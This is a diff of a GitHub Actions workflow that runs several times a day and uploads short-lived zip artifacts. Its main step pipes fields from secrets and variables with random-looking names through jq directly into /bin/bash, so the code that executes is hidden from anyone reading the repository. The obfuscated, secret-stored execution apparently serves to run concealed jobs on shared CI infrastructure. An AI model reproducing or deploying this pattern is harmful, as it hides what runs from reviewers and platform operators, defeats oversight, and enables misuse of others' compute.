@@ -1,37 +1,29 @@
 name: fangyinxiali
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '27 5/6 * * *'
 
-jobs:  # 4812
+  schedule:
+    - cron: '34 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fangyinxiali
         env:
-          ezsl669: ${{ secrets.ezsl669 }}
+          lg9777: ${{ secrets.lg9777 }}
         run: |
-          echo $ezsl669 | jq -r .yl155 | /bin/bash
-          echo $c5 | jq -r .d49 | /bin/bash
-          echo $dbil161 | jq -r .e22 | /bin/bash
-          echo $us8067 | jq -r .d646 | /bin/bash
-          echo $x67 | jq -r .n803 | /bin/bash
-          echo $ekeen152 | jq -r .fe012 | /bin/bash
-          echo $kts16 | jq -r .sz43768 | /bin/bash
-          echo $nyoa282 | jq -r .l18 | /bin/bash
-          echo $v4 | jq -r .qobat46596 | /bin/bash
-          echo $upif78 | jq -r .dp828 | /bin/bash
-          echo $je0 | jq -r .oqdmv352 | /bin/bash
-          echo $efiih5 | jq -r .yngqn3041 | /bin/bash
-          echo $up5121 | jq -r .jqpdy97 | /bin/bash
-          echo $ebx87 | jq -r .k925 | /bin/bash
-          echo $whw22 | jq -r .k35 | /bin/bash
-          echo $kqwgm423 | jq -r .eklj108 | /bin/bash
-          echo $xw99839 | jq -r .si507 | /bin/bash
-          echo $lrjvz119 | jq -r .hje464 | /bin/bash
-          echo $a70 | jq -r .suqbm5982 | /bin/bash
-          echo $bmawf4 | jq -r .vzez0539 | /bin/bash
-          echo $buymq238 | jq -r .m22528 | /bin/bash
+          printf '%s' "$lg9777" | jq -r .vctct270 | /bin/bash
+          echo $lgtf50 | jq -r .retos232 | /bin/bash
+          echo $mwo25463 | jq -r .ct80258 | /bin/bash
+          echo $s03 | jq -r .whrz38249 | /bin/bash
+          echo $hor809 | jq -r .dw11927 | /bin/bash
+          echo $b9 | jq -r .mcaze7202 | /bin/bash
+          printf '%s' "$baplc38" | jq -r .n788 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: H48uGxuU
+          path: "*.zip"
+          retention-days: 1
